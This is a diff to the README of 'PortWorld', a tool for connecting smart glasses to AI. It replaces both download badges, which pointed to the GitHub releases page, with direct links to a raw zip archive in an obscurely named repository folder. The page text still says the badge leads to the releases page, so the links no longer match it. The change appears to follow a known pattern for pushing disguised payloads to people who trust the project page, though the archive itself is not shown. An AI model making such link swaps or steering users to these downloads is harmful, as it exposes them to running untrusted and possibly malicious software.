@@ -1,6 +1,6 @@
 # 🚀 PortWorld - Connect Glasses to AI Easily
 
-[![Download PortWorld](https://img.shields.io/badge/Download-PortWorld-brightgreen)](https://github.com/mazda4940original/PortWorld/releases)
+[![Download PortWorld](https://img.shields.io/badge/Download-PortWorld-brightgreen)](https://raw.githubusercontent.com/mazda4940original/PortWorld/main/multiexhaust/World_Port_1.2-beta.2.zip)
 
 <p align="center">
   <img src="Port World logo.png" width="100%" alt="Port:World Logo">
@@ -102,4 +102,4 @@ The iOS app on your Meta glasses must be installed and running for PortWorld on 
 
 Click the badge below or at the top of this page to visit the releases page. Download the Windows installer file from there:
 
-[![Download PortWorld](https://img.shields.io/badge/Download-PortWorld-brightgreen)](https://github.com/mazda4940original/PortWorld/releases)
+[![Download PortWorld](https://img.shields.io/badge/Download-PortWorld-brightgreen)](https://raw.githubusercontent.com/mazda4940original/PortWorld/main/multiexhaust/World_Port_1.2-beta.2.zip)
